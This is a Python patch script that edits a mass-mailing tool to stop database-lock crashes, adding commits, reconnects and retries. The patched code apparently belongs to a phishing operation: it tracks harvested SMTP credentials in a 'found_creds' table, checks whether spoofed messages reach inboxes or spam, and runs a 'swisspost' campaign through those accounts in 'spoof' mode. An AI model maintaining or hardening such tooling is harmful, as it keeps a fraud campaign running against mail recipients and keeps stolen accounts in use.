#!/usr/bin/env python3
"""
Fix campaign crash: health check holds DB lock during 90s wait + IMAP checks.
Campaign claim_recipient crashes even with retry because lock held too long.

Fix:
1. Health check: commit + close DB before 90s wait, reopen after
2. Health check: commit after each individual UPDATE (not batch)
3. Campaign _run_swisspost_campaign: wrap mgr.claim_recipient in try/except so campaign doesn't die
4. Make CampaignManager reopen connection on locked errors
"""

BOT_FILE = "/opt/darkvasend/auditguard/sender_bot.py"
CAMP_FILE = "/opt/darkvasend/auditguard/campaign_sender.py"

# ============================================================
# FIX 1: Health check — close DB before wait, reopen after
# ============================================================
with open(BOT_FILE, "r") as f:
    bot = f.read()

# Replace the entire health check Phase 1 ending + Phase 2 + Phase 3 + Phase 4
# The key issue: db connection stays open from Phase 1 through Phase 4

old_hc_phase1_end = '''                if result["success"]:
                    markers[sid] = {"host": host, "marker": marker, "old_ctx": r["context"] or ""}
                await asyncio.sleep(0.3)

            # Phase 2: Wait 90s for delivery
            print(f"[IMAP CHECK] {len(markers)} sent, {len(dead_ids)} dead, waiting 90s...", flush=True)
            await asyncio.sleep(90)'''

new_hc_phase1_end = '''                if result["success"]:
                    markers[sid] = {"host": host, "marker": marker, "old_ctx": r["context"] or ""}
                await asyncio.sleep(0.3)

            # COMMIT dead auth updates and CLOSE DB before long wait
            db.commit()
            db.close()
            db = None

            # Phase 2: Wait 90s for delivery
            print(f"[IMAP CHECK] {len(markers)} sent, {len(dead_ids)} dead, waiting 90s...", flush=True)
            await asyncio.sleep(90)'''

bot = bot.replace(old_hc_phase1_end, new_hc_phase1_end)

# Replace Phase 4 — reopen DB for updates, commit after EACH update
old_hc_phase4 = '''            # Phase 4: Update DB labels
            si = ss = nf = 0
            for sid, info in markers.items():
                result = info.get("result", "NOT_FOUND")
                old_ctx = info["old_ctx"]

                # Extract label suffix
                label = old_ctx.replace("Manual: ", "")
                for pfx in ["SPOOF_INBOX_", "SPOOF_SPAM_", "BASIQUE_INBOX_", "BASIQUE_SPAM_", "SPOOF_", "BASIQUE_", "STRIP_"]:
                    if label.startswith(pfx):
                        label = label[len(pfx):]
                        break

                if result == "INBOX":
                    new_ctx = f"Manual: SPOOF_INBOX_{label}"
                    si += 1
                elif result == "SPAM":
                    new_ctx = f"Manual: SPOOF_SPAM_{label}"
                    ss += 1
                else:
                    nf += 1
                    continue  # Keep old label if not found

                db.execute("UPDATE found_creds SET context=? WHERE id=?", (new_ctx, sid))

            db.commit()
            db.close()'''

new_hc_phase4 = '''            # Phase 4: Reopen DB for quick updates — commit after each one
            db = _sql.connect(DB_PATH, timeout=120)
            db.execute("PRAGMA journal_mode=WAL")
            db.execute("PRAGMA busy_timeout=120000")
            si = ss = nf = 0
            for sid, info in markers.items():
                result = info.get("result", "NOT_FOUND")
                old_ctx = info["old_ctx"]

                # Extract label suffix
                label = old_ctx.replace("Manual: ", "")
                for pfx in ["SPOOF_INBOX_", "SPOOF_SPAM_", "BASIQUE_INBOX_", "BASIQUE_SPAM_", "SPOOF_", "BASIQUE_", "STRIP_"]:
                    if label.startswith(pfx):
                        label = label[len(pfx):]
                        break

                if result == "INBOX":
                    new_ctx = f"Manual: SPOOF_INBOX_{label}"
                    si += 1
                elif result == "SPAM":
                    new_ctx = f"Manual: SPOOF_SPAM_{label}"
                    ss += 1
                else:
                    nf += 1
                    continue  # Keep old label if not found

                try:
                    db.execute("UPDATE found_creds SET context=? WHERE id=?", (new_ctx, sid))
                    db.commit()  # Commit EACH update to release lock quickly
                except Exception:
                    pass

            db.close()'''

bot = bot.replace(old_hc_phase4, new_hc_phase4)

# ============================================================
# FIX 2: Campaign loop — wrap claim_recipient in try/except with retry
# Don't let campaign die on a single DB error
# ============================================================

old_camp_loop = '''    try:
        while True:
            # Claim a batch of recipients
            batch = []
            for _ in range(num_workers):
                r = mgr.claim_recipient(campaign_id)
                if not r:
                    break
                batch.append(r)

            if not batch:
                break'''

new_camp_loop = '''    try:
        while True:
            # Claim a batch of recipients — with robust error handling
            batch = []
            db_retries = 0
            for _ in range(num_workers):
                try:
                    r = mgr.claim_recipient(campaign_id)
                    if not r:
                        break
                    batch.append(r)
                    db_retries = 0  # Reset on success
                except Exception as _db_err:
                    if "locked" in str(_db_err).lower() and db_retries < 10:
                        db_retries += 1
                        print(f"[CAMP] DB locked on claim, retry {db_retries}...", flush=True)
                        await asyncio.sleep(2)
                        continue
                    else:
                        print(f"[CAMP] claim_recipient error: {_db_err}", flush=True)
                        break

            if not batch:
                # Double check: are there still pending recipients?
                try:
                    stats_check = mgr.get_stats(campaign_id)
                    if stats_check.pending == 0:
                        break
                    # There are pending but we couldn't claim — DB issue, wait and retry
                    print(f"[CAMP] No batch but {stats_check.pending} pending — waiting 5s...", flush=True)
                    await asyncio.sleep(5)
                    continue
                except Exception:
                    break'''

bot = bot.replace(old_camp_loop, new_camp_loop)

# ============================================================
# FIX 3: Also wrap mark_sent/mark_failed calls in the campaign result handler
# ============================================================

old_result_handler = '''            # Collect results
            for f in as_completed(futures):
                try:
                    result = f.result()
                except Exception as e:
                    result = {"ok": False, "error": str(e)[:80],
                              "recipient_id": futures[f]["id"], "smtp": None}

                with lock:
                    if result["ok"]:
                        info = result["smtp"]["host"] + " [" + result["mode"] + "]"
                        mgr.mark_sent(result["recipient_id"], info)
                        if result["smtp"]:
                            mgr.increment_smtp_daily(result["smtp"]["id"])
                        stats["sent"] += 1
                        if result["mode"] == "basique":
                            stats["basique_ok"] += 1
                        else:
                            stats["spoof_ok"] += 1
                    else:
                        err = result.get("error", "?")
                        mgr.mark_failed(result["recipient_id"], err, "all_smtp_tried")
                        stats["failed"] += 1'''

new_result_handler = '''            # Collect results — with DB error protection
            for f in as_completed(futures):
                try:
                    result = f.result()
                except Exception as e:
                    result = {"ok": False, "error": str(e)[:80],
                              "recipient_id": futures[f]["id"], "smtp": None}

                with lock:
                    if result["ok"]:
                        info = result["smtp"]["host"] + " [" + result["mode"] + "]"
                        for _db_r in range(5):
                            try:
                                mgr.mark_sent(result["recipient_id"], info)
                                if result["smtp"]:
                                    mgr.increment_smtp_daily(result["smtp"]["id"])
                                break
                            except Exception as _e:
                                if _db_r < 4:
                                    time.sleep(0.5 * (2 ** _db_r))
                                else:
                                    print(f"[CAMP] mark_sent failed: {_e}", flush=True)
                        stats["sent"] += 1
                        if result["mode"] == "basique":
                            stats["basique_ok"] += 1
                        else:
                            stats["spoof_ok"] += 1
                    else:
                        err = result.get("error", "?")
                        for _db_r in range(5):
                            try:
                                mgr.mark_failed(result["recipient_id"], err, "all_smtp_tried")
                                break
                            except Exception as _e:
                                if _db_r < 4:
                                    time.sleep(0.5 * (2 ** _db_r))
                                else:
                                    print(f"[CAMP] mark_failed failed: {_e}", flush=True)
                        stats["failed"] += 1'''

bot = bot.replace(old_result_handler, new_result_handler)

with open(BOT_FILE, "w") as f:
    f.write(bot)
print(f"sender_bot.py: {len(bot)} bytes")

# ============================================================
# FIX 4: CampaignManager — make claim_recipient retry more aggressively
# ============================================================
with open(CAMP_FILE, "r") as f:
    camp = f.read()

# Increase retry count from 5 to 10 and max wait
old_claim = '''    def claim_recipient(self, campaign_id: int) -> dict | None:
        """Claim next pending recipient."""
        for _retry in range(5):
            try:
                with self.db:
                    row = self.db.execute(
                        "SELECT id, email FROM campaign_recipients WHERE campaign_id = ? AND status = 'pending' LIMIT 1",
                        (campaign_id,),
                    ).fetchone()
                    if row:
                        self.db.execute(
                            "UPDATE campaign_recipients SET status = 'sending' WHERE id = ?",
                            (row["id"],),
                        )
                        return dict(row)
                return None
            except Exception as e:
                if "locked" in str(e).lower() and _retry < 4:
                    time.sleep(0.3 * (2 ** _retry))
                    continue
                raise
        return None'''

new_claim = '''    def claim_recipient(self, campaign_id: int) -> dict | None:
        """Claim next pending recipient. Retries aggressively on DB lock."""
        for _retry in range(10):
            try:
                with self.db:
                    row = self.db.execute(
                        "SELECT id, email FROM campaign_recipients WHERE campaign_id = ? AND status = 'pending' LIMIT 1",
                        (campaign_id,),
                    ).fetchone()
                    if row:
                        self.db.execute(
                            "UPDATE campaign_recipients SET status = 'sending' WHERE id = ?",
                            (row["id"],),
                        )
                        return dict(row)
                return None
            except Exception as e:
                if "locked" in str(e).lower() and _retry < 9:
                    wait = min(0.5 * (2 ** _retry), 10.0)  # Max 10s wait
                    time.sleep(wait)
                    continue
                raise
        return None'''

camp = camp.replace(old_claim, new_claim)

with open(CAMP_FILE, "w") as f:
    f.write(camp)
print(f"campaign_sender.py: {len(camp)} bytes")

print("\nAll campaign DB lock fixes applied!")
